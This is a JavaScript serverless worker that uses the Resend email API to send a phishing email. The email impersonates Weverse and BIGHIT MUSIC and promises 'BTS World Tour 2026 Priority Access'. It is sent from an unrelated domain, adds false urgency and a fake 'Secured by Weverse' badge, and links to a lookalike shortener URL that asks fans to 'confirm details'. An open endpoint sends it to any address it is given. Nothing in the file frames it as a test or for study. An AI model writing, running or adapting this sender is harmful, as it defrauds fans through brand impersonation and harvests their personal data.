import { Resend } from 'resend';

export default {
  async fetch(request, env) {
    const corsHeaders = {
      'Access-Control-Allow-Origin': '*',
      'Access-Control-Allow-Methods': 'POST, OPTIONS',
      'Access-Control-Allow-Headers': 'Content-Type',
    };

    if (request.method === 'OPTIONS') {
      return new Response(null, { headers: corsHeaders });
    }
    
    if (request.method !== 'POST') {
      return new Response(JSON.stringify({ error: 'Method not allowed. Use POST.' }), {
        status: 405,
        headers: { ...corsHeaders, 'Content-Type': 'application/json' }
      });
    }

    try {
      const { firstName, email } = await request.json();

      if (!firstName || !email) {
        return new Response(JSON.stringify({ success: false, error: 'Missing firstName or email' }), {
          status: 400,
          headers: { ...corsHeaders, 'Content-Type': 'application/json' }
        });
      }

      const resend = new Resend(env.RESEND_API_KEY);

      const htmlContent = `<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BTS World Tour 2026 — Priority Access</title>
    <style>
        body { margin: 0; padding: 0; background: #f5f5f5; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; -webkit-font-smoothing: antialiased; }
        .wrap { max-width: 600px; margin: 0 auto; background: #fff; }
        .head { background: #191919; padding: 40px 24px; text-align: center; }
        .logo { width: 72px; height: 72px; background: #fff; border-radius: 20px; margin: 0 auto 16px; display: flex; align-items: center; justify-content: center; font-size: 36px; font-weight: 800; color: #191919; }
        .head p { color: #888; margin: 0; font-size: 13px; letter-spacing: 1px; text-transform: uppercase; }
        .body { padding: 40px 32px; text-align: center; }
        .badge { display: inline-block; background: #f0fdf4; color: #16a34a; padding: 8px 16px; border-radius: 20px; font-size: 12px; font-weight: 700; margin-bottom: 20px; text-transform: uppercase; letter-spacing: 0.5px; }
        h1 { color: #191919; font-size: 28px; margin: 0 0 16px; font-weight: 700; line-height: 1.2; }
        .lead { color: #666; font-size: 16px; line-height: 1.6; margin: 0 0 32px; }
        .urgent { background: #fef2f2; border-left: 4px solid #ef4444; padding: 16px 20px; margin-bottom: 32px; text-align: left; }
        .urgent strong { color: #dc2626; display: block; margin-bottom: 4px; font-size: 14px; }
        .urgent span { color: #666; font-size: 13px; }
        .btn { display: inline-block; background: #7c3aed; color: #fff; padding: 18px 40px; border-radius: 8px; text-decoration: none; font-weight: 600; font-size: 16px; box-shadow: 0 4px 16px rgba(124,58,237,0.3); }
        .secure { display: flex; align-items: center; justify-content: center; gap: 8px; margin-top: 20px; font-size: 12px; color: #16a34a; }
        .foot { background: #fafafa; padding: 24px; text-align: center; border-top: 1px solid #f0f0f0; }
        .foot p { margin: 0; font-size: 12px; color: #aaa; }
        @media (max-width: 480px) { .body { padding: 32px 24px; } h1 { font-size: 24px; } }
    </style>
</head>
<body>
    <div class="wrap">
        <div class="head">
            <div class="logo">W</div>
            <p>Weverse • Official Fan Platform</p>
        </div>
        <div class="body">
            <div class="badge">★ Priority Member</div>
            <h1>Your Pre-Sale Access is Ready</h1>
            <p class="lead">You've been selected for ARMY Priority Access to BTS World Tour 2026. Confirm your details to secure your allocation window.</p>
            <div class="urgent">
                <strong>⏰ Verification Required</strong>
                <span>This link expires in 24 hours and can only be used once.</span>
            </div>
            <a href="https://weverse-verify.short.gy/" class="btn">Confirm My Details →</a>
            <div class="secure"><span>🔒</span><span>Secured by Weverse • SSL Encrypted</span></div>
        </div>
        <div class="foot">
            <p>© 2026 Weverse Co., Ltd. • HYBE</p>
        </div>
    </div>
</body>
</html>`;

      const { data, error } = await resend.emails.send({
        from: 'BIGHIT MUSIC <noreply@jesusgeneration.vip>',
        to: email,
        subject: '24 Hours: Confirm Your BTS World Tour 2026 Priority Access',
        html: htmlContent,
        headers: {
          'List-Unsubscribe': '<https://brigit.work/unsubscribe>, <mailto:unsubscribe@brigit.work?subject=unsubscribe>',
          'List-Unsubscribe-Post': 'List-Unsubscribe=One-Click'
        }
      });

      if (error) {
        return new Response(JSON.stringify({ success: false, error: error.message }), {
          status: 500,
          headers: { ...corsHeaders, 'Content-Type': 'application/json' }
        });
      }

      return new Response(JSON.stringify({ success: true, data }), {
        status: 200,
        headers: { ...corsHeaders, 'Content-Type': 'application/json' }
      });

    } catch (err) {
      return new Response(JSON.stringify({ success: false, error: err.message }), {
        status: 500,
        headers: { ...corsHeaders, 'Content-Type': 'application/json' }
      });
    }
  }
};
